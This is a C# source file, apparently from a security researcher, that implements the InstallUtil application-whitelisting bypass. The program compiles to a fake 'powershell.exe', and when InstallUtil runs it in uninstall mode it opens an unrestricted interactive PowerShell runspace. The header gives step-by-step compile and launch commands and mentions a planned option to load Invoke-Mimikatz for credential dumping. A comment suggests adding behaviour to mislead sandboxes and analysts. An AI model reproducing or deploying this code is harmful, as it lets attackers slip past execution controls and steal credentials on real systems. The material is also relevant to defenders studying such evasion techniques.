using System;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
 
//Add For PowerShell Invocation
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
 
/*
Author: Casey Smith, Twitter: @subTee
 
License: BSD 3-Clause
Step One:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  /reference:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /out:powershell.exe InstallUtil-PowerShell.cs
Step Two:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U powershell.exe
 
Coming Soon...
/ScriptPath="C:\Tools\Invoke-Mimikatz.ps1"  
 
 
 
*/
 
    public class Program
    {
        public static void Main()
        {
            Console.WriteLine("Hello From Main...I Don't Do Anything");
            //Add any behaviour here to throw off sandbox execution/analysts :)
             
        }
         
    }
     
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
             
            while(true)
            {
                string x = Console.ReadLine();
                Console.WriteLine(RunPSCommand(x));
                 
            }
             
        }
        //Based on Jared Atkinson's And Justin Warner's Work
         
        public static string RunPSCommand(string cmd)
        {
            //Init stuff
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();
 
            //Add commands
            pipeline.Commands.AddScript(cmd);
 
            //Prep PS for string output and invoke
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();
 
            //Convert records to strings
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
         }
          
         public static string RunPSFile(string cmd)
        {
            //Init stuff
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();
 
            //Add commands
            pipeline.Commands.AddScript(cmd);
 
            //Prep PS for string output and invoke
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();
 
            //Convert records to strings
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }
    }